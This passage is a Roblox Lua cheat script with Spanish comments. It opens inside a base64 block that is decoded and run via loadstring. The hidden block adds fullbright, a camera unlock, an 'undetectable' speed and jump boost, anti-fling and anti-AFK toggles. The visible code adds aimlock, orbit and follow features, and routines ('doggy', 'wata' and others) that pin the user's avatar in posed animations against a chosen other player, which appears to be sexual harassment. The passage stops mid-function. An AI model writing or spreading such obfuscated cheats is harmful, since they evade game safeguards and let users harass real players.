b2x1bWUKCQlzb3VuZC5Wb2x1bWUgPSAwCgllbmQKZW5kKQoKTWFpblRhYjpDcmVhdGVUb2dnbGUoewoJTmFtZSA9ICJNdXRlYXIgc29uaWRvcyAodm96IG5vKSIsCglDdXJyZW50VmFsdWUgPSBmYWxzZSwKCUZsYWcgPSAiTXV0ZUF1ZGlvcyIsCglDYWxsYmFjayA9IGZ1bmN0aW9uKFZhbHVlKQoJCXRvZ2dsZUFjdGl2ZSA9IFZhbHVlCgkJaWYgVmFsdWUgdGhlbgoJCQltdXRlQWxsRXhjZXB0Vm9pY2UoKQoJCWVsc2UKCQkJdW5tdXRlQWxsKCkKCQllbmQKCWVuZAp9KQoKCgoKLS0tRnVsbGJyaWdodAoKbG9jYWwgTGlnaHRpbmcgPSBnYW1lOkdldFNlcnZpY2UoIkxpZ2h0aW5nIikKbG9jYWwgUnVuU2VydmljZSA9IGdhbWU6R2V0U2VydmljZSgiUnVuU2VydmljZSIpCmxvY2FsIG9yaWdpbmFsU2V0dGluZ3MgPSB7fQpsb2NhbCBjb25uZWN0aW9uCgpNYWluVGFiOkNyZWF0ZVRvZ2dsZSh7CglOYW1lID0gIkZ1bGxicmlnaHQiLAoJRmxhZyA9ICJGdWxsYnJpZ2h0IiwKCUN1cnJlbnRWYWx1ZSA9IGZhbHNlLAoJQ2FsbGJhY2sgPSBmdW5jdGlvbihlbmFibGVkKQoJCWlmIGVuYWJsZWQgdGhlbgoJCQktLSBHdWFyZGFyIHZhbG9yZXMgb3JpZ2luYWxlcwoJCQlvcmlnaW5hbFNldHRpbmdzLkJyaWdodG5lc3MgPSBMaWdodGluZy5CcmlnaHRuZXNzCgkJCW9yaWdpbmFsU2V0dGluZ3MuQ2xvY2tUaW1lID0gTGlnaHRpbmcuQ2xvY2tUaW1lCgkJCW9yaWdpbmFsU2V0dGluZ3MuQW1iaWVudCA9IExpZ2h0aW5nLkFtYmllbnQKCQkJb3JpZ2luYWxTZXR0aW5ncy5PdXRkb29yQW1iaWVudCA9IExpZ2h0aW5nLk91dGRvb3JBbWJpZW50CgkJCW9yaWdpbmFsU2V0dGluZ3MuR2xvYmFsU2hhZG93cyA9IExpZ2h0aW5nLkdsb2JhbFNoYWRvd3MKCgkJCS0tIENvbmV4acOzbiBwYXJhIGZvcnphciBpbHVtaW5hY2nDs24KCQkJaWYgbm90IGNvbm5lY3Rpb24gdGhlbgoJCQkJY29ubmVjdGlvbiA9IFJ1blNlcnZpY2UuUmVuZGVyU3RlcHBlZDpDb25uZWN0KGZ1bmN0aW9uKCkKCQkJCQlMaWdodGluZy5CcmlnaHRuZXNzID0gMS41CgkJCQkJTGlnaHRpbmcuQ2xvY2tUaW1lID0gMTIKCQkJCQlMaWdodGluZy5BbWJpZW50ID0gQ29sb3IzLm5ldygxLCAxLCAxKQoJCQkJCUxpZ2h0aW5nLk91dGRvb3JBbWJpZW50ID0gQ29sb3IzLm5ldygxLCAxLCAxKQoJCQkJCUxpZ2h0aW5nLkdsb2JhbFNoYWRvd3MgPSBmYWxzZQoJCQkJZW5kKQoJCQllbmQKCQllbHNlCgkJCS0tIFJlc3RhdXJhciB2YWxvcmVzCgkJCWlmIGNvbm5lY3Rpb24gdGhlbgoJCQkJY29ubmVjdGlvbjpEaXNjb25uZWN0KCkKCQkJCWNvbm5lY3Rpb24gPSBuaWwKCQkJZW5kCgkJCWZvciBwcm9wLCB2YWx1ZSBpbiBwYWlycyhvcmlnaW5hbFNldHRpbmdzKSBkbwoJCQkJTGlnaHRpbmdbcHJvcF0gPSB2YWx1ZQoJCQllbmQKCQllbmQKCWVuZAp9KQoKCgoKCi0tIFNlcnZpY2lvcyB5IHZhcmlhYmxlcyBuZWNlc2FyaWFzCmxvY2FsIFBsYXllcnMgPSBnYW1lOkdldFNlcnZpY2UoIlBsYXllcnMiKQpsb2NhbCBSdW5TZXJ2aWNlID0gZ2FtZTpHZXRTZXJ2aWNlKCJSdW5TZXJ2aWNlIikKbG9jYWwgTG9jYWxQbGF5ZXIgPSBQbGF5ZXJzLkxvY2FsUGxheWVyCmxvY2FsIENhbWVyYSA9IHdvcmtzcGFjZS5DdXJyZW50Q2FtZXJhCgpsb2NhbCB1bmxvY2tDYW1lcmFDb25uZWN0aW9uCmxvY2FsIGNhbWVyYVVubG9ja2VkID0gZmFsc2UgLS0gSU5JQ0lBTE1FTlRFIEZBTFNPCmxvY2FsIG9yaWdpbmFsQ2FtZXJhU2V0dGluZ3MgPSB7fQoKLS0gRnVuY2nDs24gcGFyYSBmb3J6YXIgZWwgY29udHJvbCBkZSBjw6FtYXJhCmxvY2FsIGZ1bmN0aW9uIGVuYWJsZUNhbWVyYUNvbnRyb2woKQoJbG9jYWwgY2hhcmFjdGVyID0gTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyIG9yIExvY2FsUGxheWVyLkNoYXJhY3RlckFkZGVkOldhaXQoKQoJbG9jYWwgaHVtYW5vaWQgPSBjaGFyYWN0ZXI6V2FpdEZvckNoaWxkKCJIdW1hbm9pZCIpCgoJLS0gR3VhcmRhciBlc3RhZG8gb3JpZ2luYWwgdW5hIHNvbGEgdmV6CglpZiBub3Qgb3JpZ2luYWxDYW1lcmFTZXR0aW5ncy5zYXZlZCB0aGVuCgkJb3JpZ2luYWxDYW1lcmFTZXR0aW5ncy5DYW1lcmFUeXBlID0gQ2FtZXJhLkNhbWVyYVR5cGUKCQlvcmlnaW5hbENhbWVyYVNldHRpbmdzLkNhbWVyYVN1YmplY3QgPSBDYW1lcmEuQ2FtZXJhU3ViamVjdAoJCW9yaWdpbmFsQ2FtZXJhU2V0dGluZ3MuQ2FtZXJhTW9kZSA9IExvY2FsUGxheWVyLkNhbWVyYU1vZGUKCQlvcmlnaW5hbENhbWVyYVNldHRpbmdzLk1heFpvb20gPSBMb2NhbFBsYXllci5DYW1lcmFNYXhab29tRGlzdGFuY2UKCQlvcmlnaW5hbENhbWVyYVNldHRpbmdzLk1pblpvb20gPSBMb2NhbFBsYXllci5DYW1lcmFNaW5ab29tRGlzdGFuY2UKCQlvcmlnaW5hbENhbWVyYVNldHRpbmdzLnNhdmVkID0gdHJ1ZQoJZW5kCgoJLS0gRGVzY29uZWN0YXIgc2kgeWEgaGFiw61hIHVuYSBjb25leGnDs24gcHJldmlhCglpZiB1bmxvY2tDYW1lcmFDb25uZWN0aW9uIHRoZW4KCQl1bmxvY2tDYW1lcmFDb25uZWN0aW9uOkRpc2Nvbm5lY3QoKQoJZW5kCgoJdW5sb2NrQ2FtZXJhQ29ubmVjdGlvbiA9IFJ1blNlcnZpY2UuUmVuZGVyU3RlcHBlZDpDb25uZWN0KGZ1bmN0aW9uKCkKCQlpZiBub3QgY2FtZXJhVW5sb2NrZWQgdGhlbiByZXR1cm4gZW5kCgoJCWlmIENhbWVyYS5DYW1lcmFUeXBlIH49IEVudW0uQ2FtZXJhVHlwZS5DdXN0b20gdGhlbgoJCQlDYW1lcmEuQ2FtZXJhVHlwZSA9IEVudW0uQ2FtZXJhVHlwZS5DdXN0b20KCQllbmQKCgkJaWYgQ2FtZXJhLkNhbWVyYVN1YmplY3Qgfj0gaHVtYW5vaWQgdGhlbgoJCQlDYW1lcmEuQ2FtZXJhU3ViamVjdCA9IGh1bWFub2lkCgkJZW5kCgoJCUxvY2FsUGxheWVyLkNhbWVyYU1vZGUgPSBFbnVtLkNhbWVyYU1vZGUuQ2xhc3NpYwoJCUxvY2FsUGxheWVyLkNhbWVyYU1heFpvb21EaXN0YW5jZSA9IDEyOAoJCUxvY2FsUGxheWVyLkNhbWVyYU1pblpvb21EaXN0YW5jZSA9IDAuNQoJZW5kKQplbmQKCi0tIFRPR0dMRTogVW5sb2NrIENhbWVyYQpNYWluVGFiOkNyZWF0ZVRvZ2dsZSh7CglOYW1lID0gIkRlc2Jsb3F1ZWFyIENhbWFyYSIsCglGbGFnID0gInVubG9ja0NhbSIsCglDdXJyZW50VmFsdWUgPSBmYWxzZSwKCUNhbGxiYWNrID0gZnVuY3Rpb24oZW5hYmxlZCkKCQljYW1lcmFVbmxvY2tlZCA9IGVuYWJsZWQKCgkJaWYgZW5hYmxlZCB0aGVuCgkJCWVuYWJsZUNhbWVyYUNvbnRyb2woKQoJCWVsc2UKCQkJLS0gRGVzY29uZWN0YXIgcmVuZGVyIGxvb3AKCQkJaWYgdW5sb2NrQ2FtZXJhQ29ubmVjdGlvbiB0aGVuCgkJCQl1bmxvY2tDYW1lcmFDb25uZWN0aW9uOkRpc2Nvbm5lY3QoKQoJCQkJdW5sb2NrQ2FtZXJhQ29ubmVjdGlvbiA9IG5pbAoJCQllbmQKCgkJCS0tIFJlc3RhdXJhciB2YWxvcmVzIG9yaWdpbmFsZXMgc2kgZXN0YWJhbiBndWFyZGFkb3MKCQkJaWYgb3JpZ2luYWxDYW1lcmFTZXR0aW5ncy5zYXZlZCB0aGVuCgkJCQlDYW1lcmEuQ2FtZXJhVHlwZSA9IG9yaWdpbmFsQ2FtZXJhU2V0dGluZ3MuQ2FtZXJhVHlwZQoJCQkJQ2FtZXJhLkNhbWVyYVN1YmplY3QgPSBvcmlnaW5hbENhbWVyYVNldHRpbmdzLkNhbWVyYVN1YmplY3QKCQkJCUxvY2FsUGxheWVyLkNhbWVyYU1vZGUgPSBvcmlnaW5hbENhbWVyYVNldHRpbmdzLkNhbWVyYU1vZGUKCQkJCUxvY2FsUGxheWVyLkNhbWVyYU1heFpvb21EaXN0YW5jZSA9IG9yaWdpbmFsQ2FtZXJhU2V0dGluZ3MuTWF4Wm9vbQoJCQkJTG9jYWxQbGF5ZXIuQ2FtZXJhTWluWm9vbURpc3RhbmNlID0gb3JpZ2luYWxDYW1lcmFTZXR0aW5ncy5NaW5ab29tCgkJCWVuZAoJCWVuZAoJZW5kCn0pCgotLSBFamVjdXRhciBlbmFibGVDYW1lcmFDb250cm9sKCkgc29sbyBzaSBlbCB0b2dnbGUgZXN0w6EgYWN0aXZhZG8gYWwgY2FyZ2FyIChvcGNpb25hbCkKaWYgY2FtZXJhVW5sb2NrZWQgdGhlbgoJZW5hYmxlQ2FtZXJhQ29udHJvbCgpCmVuZAoKLS0gUmVhcGxpY2FyIHNpIHJlYXBhcmVjZSBlbCBwZXJzb25hamUsIHBlcm8gc29sbyBzaSBlc3TDoSBhY3RpdmFkbwpMb2NhbFBsYXllci5DaGFyYWN0ZXJBZGRlZDpDb25uZWN0KGZ1bmN0aW9uKCkKCWlmIGNhbWVyYVVubG9ja2VkIHRoZW4KCQllbmFibGVDYW1lcmFDb250cm9sKCkKCWVuZAplbmQpCgoKCgoKCgoKCgoKLS0gQXNlZ8O6cmF0ZSBkZSBxdWUgZXN0YXMgdmFyaWFibGVzIGVzdMOhbiBkZWZpbmlkYXMKbG9jYWwgUGxheWVycyA9IGdhbWU6R2V0U2VydmljZSgiUGxheWVycyIpCmxvY2FsIExvY2FsUGxheWVyID0gUGxheWVycy5Mb2NhbFBsYXllcgoKLS0gVmFyaWFibGVzIGRlIGNvbnRyb2wKbG9jYWwgYm9vc3RFbmFibGVkID0gZmFsc2UKbG9jYWwgYm9vc3RTdHJlbmd0aCA9IDEwMApsb2NhbCBiYXNlV2Fsa1NwZWVkID0gMTYKbG9jYWwgYmFzZUp1bXBQb3dlciA9IDUwCmxvY2FsIG9yaWdpbmFsU3RhdHMgPSB7fQoKLS0gRnVuY2nDs24gcGFyYSBhcGxpY2FyIGJvb3N0CmxvY2FsIGZ1bmN0aW9uIGFwcGx5Qm9vc3QoKQoJbG9jYWwgY2hhcmFjdGVyID0gTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyIG9yIExvY2FsUGxheWVyLkNoYXJhY3RlckFkZGVkOldhaXQoKQoJbG9jYWwgaHVtYW5vaWQgPSBjaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGRXaGljaElzQSgiSHVtYW5vaWQiKQoJaWYgaHVtYW5vaWQgdGhlbgoJCS0tIEd1YXJkYXIgdmFsb3JlcyBvcmlnaW5hbGVzIHVuYSB2ZXoKCQlpZiBub3Qgb3JpZ2luYWxTdGF0cy5zYXZlZCB0aGVuCgkJCW9yaWdpbmFsU3RhdHMuV2Fsa1NwZWVkID0gaHVtYW5vaWQuV2Fsa1NwZWVkCgkJCW9yaWdpbmFsU3RhdHMuSnVtcFBvd2VyID0gaHVtYW5vaWQuSnVtcFBvd2VyCgkJCW9yaWdpbmFsU3RhdHMuc2F2ZWQgPSB0cnVlCgkJZW5kCgoJCWh1bWFub2lkLlVzZUp1bXBQb3dlciA9IHRydWUKCQlsb2NhbCBzcGVlZE11bHRpcGxpZXIgPSAoYm9vc3RTdHJlbmd0aCAqIDAuMSkgLyAxMDAKCQlsb2NhbCBqdW1wTXVsdGlwbGllciA9IChib29zdFN0cmVuZ3RoICogMC40KSAvIDEwMAoJCWh1bWFub2lkLldhbGtTcGVlZCA9IGJhc2VXYWxrU3BlZWQgKiAoMSArIHNwZWVkTXVsdGlwbGllcikKCQlodW1hbm9pZC5KdW1wUG93ZXIgPSBiYXNlSnVtcFBvd2VyICogKDEgKyBqdW1wTXVsdGlwbGllcikKCWVuZAplbmQKCi0tIFJlc3RhdXJhciB2YWxvcmVzIG9yaWdpbmFsZXMKbG9jYWwgZnVuY3Rpb24gcmVzdG9yZVN0YXRzKCkKCWxvY2FsIGNoYXJhY3RlciA9IExvY2FsUGxheWVyLkNoYXJhY3RlciBvciBMb2NhbFBsYXllci5DaGFyYWN0ZXJBZGRlZDpXYWl0KCkKCWxvY2FsIGh1bWFub2lkID0gY2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkV2hpY2hJc0EoIkh1bWFub2lkIikKCWlmIGh1bWFub2lkIGFuZCBvcmlnaW5hbFN0YXRzLnNhdmVkIHRoZW4KCQlodW1hbm9pZC5XYWxrU3BlZWQgPSBvcmlnaW5hbFN0YXRzLldhbGtTcGVlZAoJCWh1bWFub2lkLkp1bXBQb3dlciA9IG9yaWdpbmFsU3RhdHMuSnVtcFBvd2VyCgllbmQKZW5kCgotLSBUb2dnbGUgZW4gTWFpblRhYgpNYWluVGFiOkNyZWF0ZVRvZ2dsZSh7CglOYW1lID0gIlNhbHRvIHkgVmVsb2NpZGFkIEluZGV0ZWN0YWJsZSIsCglGbGFnID0gIm1vdmVtZW50Qm9vc3QiLAoJQ3VycmVudFZhbHVlID0gZmFsc2UsCglDYWxsYmFjayA9IGZ1bmN0aW9uKHZhbHVlKQoJCWJvb3N0RW5hYmxlZCA9IHZhbHVlCgkJaWYgYm9vc3RFbmFibGVkIHRoZW4KCQkJYXBwbHlCb29zdCgpCgkJZWxzZQoJCQlyZXN0b3JlU3RhdHMoKQoJCWVuZAoJZW5kCn0pCgotLSBTbGlkZXIgZW4gTWFpblRhYgpNYWluVGFiOkNyZWF0ZVNsaWRlcih7CglOYW1lID0gIkF1bWVudG8gVmVsb2NpZGFkIEluZGV0ZWN0YWJsZSIsCglGbGFnID0gImJvb3N0U3RyZW5ndGgiLAoJUmFuZ2UgPSB7MCwgMTAwfSwKCUluY3JlbWVudCA9IDUsCglDdXJyZW50VmFsdWUgPSBib29zdFN0cmVuZ3RoLAoJU3VmZml4ID0gIisiLAoJQ2FsbGJhY2sgPSBmdW5jdGlvbih2YWx1ZSkKCQlib29zdFN0cmVuZ3RoID0gdmFsdWUKCQlpZiBib29zdEVuYWJsZWQgdGhlbgoJCQlhcHBseUJvb3N0KCkKCQllbmQKCWVuZAp9KQoKCgoKCgoKCi0tLS0tCgoKCgoKCgpsb2NhbCBQbGF5ZXJzID0gZ2FtZTpHZXRTZXJ2aWNlKCJQbGF5ZXJzIikKbG9jYWwgTG9jYWxQbGF5ZXIgPSBQbGF5ZXJzLkxvY2FsUGxheWVyCmxvY2FsIFJ1blNlcnZpY2UgPSBnYW1lOkdldFNlcnZpY2UoIlJ1blNlcnZpY2UiKQoKbG9jYWwgYW50aUZsaW5nRW5hYmxlZCA9IGZhbHNlCmxvY2FsIGNoYXJhY3RlckNvbm5lY3Rpb25zID0ge30KbG9jYWwgY29sbGlzaW9uTG9vcAoKbG9jYWwgZnVuY3Rpb24gU2V0Tm9Db2xsaXNpb24oY2hhcmFjdGVyKQoJZm9yIF8sIGl0ZW0gaW4gcGFpcnMoY2hhcmFjdGVyOkdldERlc2NlbmRhbnRzKCkpIGRvCgkJaWYgaXRlbTpJc0EoIkJhc2VQYXJ0IikgYW5kIGl0ZW0uQ2FuQ29sbGlkZSB0aGVuCgkJCWl0ZW0uQ2FuQ29sbGlkZSA9IGZhbHNlCgkJZW5kCgllbmQKZW5kCgpsb2NhbCBmdW5jdGlvbiBPbkNoYXJhY3RlckFkZGVkKHBsYXllciwgY2hhcmFjdGVyKQoJaWYgbm90IGFudGlGbGluZ0VuYWJsZWQgb3IgcGxheWVyID09IExvY2FsUGxheWVyIHRoZW4gcmV0dXJuIGVuZAoJU2V0Tm9Db2xsaXNpb24oY2hhcmFjdGVyKQoKCS0tIE51ZXZhcyBwYXJ0ZXMKCWxvY2FsIGNvbm4gPSBjaGFyYWN0ZXIuRGVzY2VuZGFudEFkZGVkOkNvbm5lY3QoZnVuY3Rpb24oZGVzYykKCQlpZiBkZXNjOklzQSgiQmFzZVBhcnQiKSB0aGVuCgkJCWRlc2MuQ2FuQ29sbGlkZSA9IGZhbHNlCgkJZW5kCgllbmQpCgoJY2hhcmFjdGVyQ29ubmVjdGlvbnNbcGxheWVyXSA9IGNvbm4KZW5kCgpsb2NhbCBmdW5jdGlvbiBFbmFibGVBbnRpRmxpbmcoKQoJLS0gSW5pY2lhbAoJZm9yIF8sIHBsYXllciBpbiBwYWlycyhQbGF5ZXJzOkdldFBsYXllcnMoKSkgZG8KCQlpZiBwbGF5ZXIgfj0gTG9jYWxQbGF5ZXIgdGhlbgoJCQlpZiBwbGF5ZXIuQ2hhcmFjdGVyIHRoZW4KCQkJCU9uQ2hhcmFjdGVyQWRkZWQocGxheWVyLCBwbGF5ZXIuQ2hhcmFjdGVyKQoJCQllbmQKCQkJY2hhcmFjdGVyQ29ubmVjdGlvbnNbcGxheWVyXSA9IHBsYXllci5DaGFyYWN0ZXJBZGRlZDpDb25uZWN0KGZ1bmN0aW9uKGNoYXIpCgkJCQlPbkNoYXJhY3RlckFkZGVkKHBsYXllciwgY2hhcikKCQkJZW5kKQoJCWVuZAoJZW5kCgoJLS0gTnVldm9zIGp1Z2Fkb3JlcwoJY2hhcmFjdGVyQ29ubmVjdGlvbnNbIl9QbGF5ZXJBZGRlZCJdID0gUGxheWVycy5QbGF5ZXJBZGRlZDpDb25uZWN0KGZ1bmN0aW9uKHBsYXllcikKCQlpZiBwbGF5ZXIgPT0gTG9jYWxQbGF5ZXIgdGhlbiByZXR1cm4gZW5kCgkJY2hhcmFjdGVyQ29ubmVjdGlvbnNbcGxheWVyXSA9IHBsYXllci5DaGFyYWN0ZXJBZGRlZDpDb25uZWN0KGZ1bmN0aW9uKGNoYXIpCgkJCU9uQ2hhcmFjdGVyQWRkZWQocGxheWVyLCBjaGFyKQoJCWVuZCkKCWVuZCkKCgktLSBMb29wIHNlZ3VybyBjYWRhIDAuMjVzIHBhcmEgbWFudGVuZXIgY29saXNpw7NuIGRlc2FjdGl2YWRhCglsb2NhbCB0aW1lciA9IDAKCWNvbGxpc2lvbkxvb3AgPSBSdW5TZXJ2aWNlLlN0ZXBwZWQ6Q29ubmVjdChmdW5jdGlvbihfLCBkdCkKCQl0aW1lciArPSBkdAoJCWlmIHRpbWVyID49IDAuMjUgdGhlbgoJCQl0aW1lciA9IDAKCQkJZm9yIF8sIHBsYXllciBpbiBwYWlycyhQbGF5ZXJzOkdldFBsYXllcnMoKSkgZG8KCQkJCWlmIHBsYXllciB+PSBMb2NhbFBsYXllciBhbmQgcGxheWVyLkNoYXJhY3RlciB0aGVuCgkJCQkJU2V0Tm9Db2xsaXNpb24ocGxheWVyLkNoYXJhY3RlcikKCQkJCWVuZAoJCQllbmQKCQllbmQKCWVuZCkKZW5kCgpsb2NhbCBmdW5jdGlvbiBEaXNhYmxlQW50aUZsaW5nKCkKCWZvciBfLCBjb25uIGluIHBhaXJzKGNoYXJhY3RlckNvbm5lY3Rpb25zKSBkbwoJCWlmIHR5cGVvZihjb25uKSA9PSAiUkJYU2NyaXB0Q29ubmVjdGlvbiIgdGhlbgoJCQljb25uOkRpc2Nvbm5lY3QoKQoJCWVuZAoJZW5kCgljaGFyYWN0ZXJDb25uZWN0aW9ucyA9IHt9CgoJaWYgY29sbGlzaW9uTG9vcCB0aGVuCgkJY29sbGlzaW9uTG9vcDpEaXNjb25uZWN0KCkKCQljb2xsaXNpb25Mb29wID0gbmlsCgllbmQKCgktLSBSZXN0YXVyYXIgY29saXNpw7NuCglmb3IgXywgcGxheWVyIGluIHBhaXJzKFBsYXllcnM6R2V0UGxheWVycygpKSBkbwoJCWlmIHBsYXllciB+PSBMb2NhbFBsYXllciBhbmQgcGxheWVyLkNoYXJhY3RlciB0aGVuCgkJCWZvciBfLCBwYXJ0IGluIHBhaXJzKHBsYXllci5DaGFyYWN0ZXI6R2V0RGVzY2VuZGFudHMoKSkgZG8KCQkJCWlmIHBhcnQ6SXNBKCJCYXNlUGFydCIpIHRoZW4KCQkJCQlwYXJ0LkNhbkNvbGxpZGUgPSB0cnVlCgkJCQllbmQKCQkJZW5kCgkJZW5kCgllbmQKZW5kCgpNYWluVGFiOkNyZWF0ZVRvZ2dsZSh7CglOYW1lID0gIkFudGktRmxpbmciLAoJQ3VycmVudFZhbHVlID0gZmFsc2UsCglDYWxsYmFjayA9IGZ1bmN0aW9uKHN0YXRlKQoJCWFudGlGbGluZ0VuYWJsZWQgPSBzdGF0ZQoJCWlmIHN0YXRlIHRoZW4KCQkJRW5hYmxlQW50aUZsaW5nKCkKCQllbHNlCgkJCURpc2FibGVBbnRpRmxpbmcoKQoJCWVuZAoJZW5kLAp9KQoKCgotLS0tLUFudGkgQUZLCgoKCmxvY2FsIFBsYXllcnMgPSBnYW1lOkdldFNlcnZpY2UoIlBsYXllcnMiKQpsb2NhbCBwbGF5ZXIgPSBQbGF5ZXJzLkxvY2FsUGxheWVyCmxvY2FsIGNoYXJhY3RlciA9IHBsYXllci5DaGFyYWN0ZXIgb3IgcGxheWVyLkNoYXJhY3RlckFkZGVkOldhaXQoKQpsb2NhbCBodW1hbm9pZCA9IGNoYXJhY3RlcjpXYWl0Rm9yQ2hpbGQoIkh1bWFub2lkIikKbG9jYWwgY2FtZXJhID0gd29ya3NwYWNlLkN1cnJlbnRDYW1lcmEKCmxvY2FsIEFudGlBZmtFbmFibGVkID0gZmFsc2UKbG9jYWwgQW50aUFma1RocmVhZAoKTWFpblRhYjpDcmVhdGVUb2dnbGUoewogICAgTmFtZSA9ICJBbnRpLUFGSyBPUCIsCiAgICBDdXJyZW50VmFsdWUgPSBmYWxzZSwKICAgIEZsYWcgPSAiQW50aUFma1RvZ2dsZSIsCiAgICBDYWxsYmFjayA9IGZ1bmN0aW9uKFZhbHVlKQogICAgICAgIEFudGlBZmtFbmFibGVkID0gVmFsdWUKCiAgICAgICAgaWYgQW50aUFma0VuYWJsZWQgdGhlbgogICAgICAgICAgICBBbnRpQWZrVGhyZWFkID0gdGFzay5zcGF3bihmdW5jdGlvbigpCiAgICAgICAgICAgICAgICB3aGlsZSBBbnRpQWZrRW5hYmxlZCBkbwogICAgICAgICAgICAgICAgICAgIC0tIFNpbXVsYXIgc2FsdG8KICAgICAgICAgICAgICAgICAgICBpZiBodW1hbm9pZCBhbmQgaHVtYW5vaWQuSGVhbHRoID4gMCB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgIGh1bWFub2lkOkNoYW5nZVN0YXRlKEVudW0uSHVtYW5vaWRTdGF0ZVR5cGUuSnVtcGluZykKICAgICAgICAgICAgICAgICAgICBlbmQKCiAgICAgICAgICAgICAgICAgICAgLS0gU2ltdWxhciByb3RhY2nDs24gZGUgY8OhbWFyYQogICAgICAgICAgICAgICAgICAgIGxvY2FsIGNhbUNGID0gY2FtZXJhLkNGcmFtZQogICAgICAgICAgICAgICAgICAgIGxvY2FsIHJvdGF0aW9uID0gQ0ZyYW1lLkFuZ2xlcygwLCBtYXRoLnJhZCgxKSwgMCkgLS0gZ2lyYSB1biBwb2NvIGEgbGEgZGVyZWNoYQogICAgICAgICAgICAgICAgICAgIGNhbWVyYS5DRnJhbWUgPSBjYW1DRiAqIHJvdGF0aW9uCgogICAgICAgICAgICAgICAgICAgIHRhc2sud2FpdCg2MCkgLS0gY2FkYSA2MCBzZWd1bmRvcwogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIGVuZCkKICAgICAgICBlbHNlCiAgICAgICAgICAgIGlmIEFudGlBZmtUaHJlYWQgdGhlbgogICAgICAgICAgICAgICAgdGFzay5jYW5jZWwoQW50aUFma1RocmVhZCkKICAgICAgICAgICAgICAgIEFudGlBZmtUaHJlYWQgPSBuaWwKICAgICAgICAgICAgZW5kCiAgICAgICAgZW5kCiAgICBlbmQsCn0pCgoK
]]

-- Decodificamos y ejecutamos
loadstring(base64decode(encoded))()



























----JUGADORES---
JugadoresTab = Window:CreateTab("Jugadores")
JugadoresTab:CreateSection("Acciones")


-- Variables globales necesarias
local selectedPlayer = nil
local aimlockEnabled = false
local aimlockConnection
local orbitConnection
local sitConnection
local followConnection
local isSitting = false
local orbitSpeed = 20
local orbitDistance = 10
local followOffsetZ = 5
local orbitEnabled = false
local followEnabled = false
local doggyEnabled = false
local doggyConnection
local doggyAnimId = 13694096724
local doggyAnimTime = 2.6
local doggySpeed = 1 -- Velocidad fija para el movimiento doggy
local doggyDirection = 1
local doggyCurrentDistance = 2.7
local doggyTargetDistance = 4

-- Variables globales necesarias
local pataEnabled = false
local pataConnection
local pataAnimId = 18526288497
local pataAnimTime = 2.44
local pataSpeed = 1 -- Velocidad fija para el movimiento pata
local pataDirection = 1
local pataCurrentDistance = 3
local pataTargetDistance = 4

-- Variables globales necesarias
local cariEnabled = false
local cariConnection
local cariAnimId = 15679624464
local cariAnimTime = 2.6
local cariSpeed = 5-- Velocidad fija para el movimiento cari
local cariDirection = 1
local cariCurrentDistance = 2.7
local cariTargetDistance = 4

-- Variables globales necesarias
local wataEnabled = false
local wataConnection
local wataAnimId = 12992262118
local wataAnimTime = 5.6
local wataSpeed = 5 -- Velocidad fija para el movimiento Wata
local wataDirection = 1
local wataCurrentDistance = 2
local wataTargetDistance = 3
local savedCollisions = {}

-- Función para controlar la colisión
local function SetNoCollision(char, state)
    if state then
        -- Guardar estado original
        savedCollisions[char] = {}
        for _, part in ipairs(char:GetDescendants()) do
            if part:IsA("BasePart") then
                savedCollisions[char][part] = part.CanCollide
                part.CanCollide = false
            end
        end
    else
        -- Restaurar el estado original
        if savedCollisions[char] then
            for part, original in pairs(savedCollisions[char]) do
                if part and part:IsA("BasePart") then
                    part.CanCollide = original
                end
            end
            savedCollisions[char] = nil
        end
    end
end

-- Función para ejecutar el Wata
local function PlayWata(target)
    if not target or not target.Character then return end
    local char = game.Players.LocalPlayer.Character or game.Players.LocalPlayer.CharacterAdded:Wait()
    local humanoid = char:WaitForChild("Humanoid")
    local root = char:WaitForChild("HumanoidRootPart")
    local targetRoot = target.Character:WaitForChild("HumanoidRootPart")
    if not humanoid or not root or not targetRoot then return end

    -- Animación Wata
    local anim = Instance.new("Animation")
    anim.AnimationId = "rbxassetid://" .. wataAnimId
    local track = humanoid:LoadAnimation(anim)
    track:Play()
    track.TimePosition = wataAnimTime
    track:AdjustSpeed(0)

    humanoid.AutoRotate = false
    humanoid.WalkSpeed = 0
    humanoid.JumpPower = 0
    SetNoCollision(char, true)

    -- Ciclo de movimiento hacia adelante y atrás
    wataConnection = game:GetService("RunService").Heartbeat:Connect(function(dt)
        if not targetRoot.Parent then return end

        -- Ajustar distancia
        wataCurrentDistance = wataCurrentDistance + (wataSpeed * wataDirection * game:GetService("RunService").Heartbeat:Wait())

        -- Cambiar dirección si se alcanza la distancia máxima o mínima
        if wataCurrentDistance >= wataTargetDistance then
            wataDirection = -1
        elseif wataCurrentDistance <= 1.2 then
            wataDirection = 1
        end

        -- Posicionar al jugador enfrente del objetivo y mirando hacia él
        local offsetPosition = targetRoot.Position + targetRoot.CFrame.LookVector * wataCurrentDistance + Vector3.new(0, 0.23, 0)
        root.CFrame = CFrame.lookAt(offsetPosition, targetRoot.Position)
    end)
end

-- Función para detener el Wata
local function StopWata()
    local char = game.Players.LocalPlayer.Character or game.Players.LocalPlayer.CharacterAdded:Wait()
    local humanoid = char:FindFirstChild("Humanoid")
    local root = char:FindFirstChild("HumanoidRootPart")

    if wataConnection then
        wataConnection:Disconnect()
        wataConnection = nil
    end

    if humanoid then
        humanoid.AutoRotate = true
        humanoid.WalkSpeed = 16
        humanoid.JumpPower = 50
        for _, track in humanoid:GetPlayingAnimationTracks() do
            if tostring(track.Animation.AnimationId):find(tostring(wataAnimId)) then
                track:Stop()
            end
        end
    end

    if char then
        SetNoCollision(char, false)
    end
end


-- Función para controlar la colisión
local function SetNoCollision(char, state)
    if state then
        -- Guardar estado original
        savedCollisions[char] = {}
        for _, part in ipairs(char:GetDescendants()) do
            if part:IsA("BasePart") then
                savedCollisions[char][part] = part.CanCollide
                part.CanCollide = false
            end
        end
    else
        -- Restaurar el estado original
        if savedCollisions[char] then
            for part, original in pairs(savedCollisions[char]) do
                if part and part:IsA("BasePart") then
                    part.CanCollide = original
                end
            end
            savedCollisions[char] = nil
        end
    end
end

-- Función para ejecutar el Cari
local function PlayCari(target)
    if not target or not target.Character then return end
    local char = game.Players.LocalPlayer.Character or game.Players.LocalPlayer.CharacterAdded:Wait()
    local humanoid = char:WaitForChild("Humanoid")
    local root = char:WaitForChild("HumanoidRootPart")
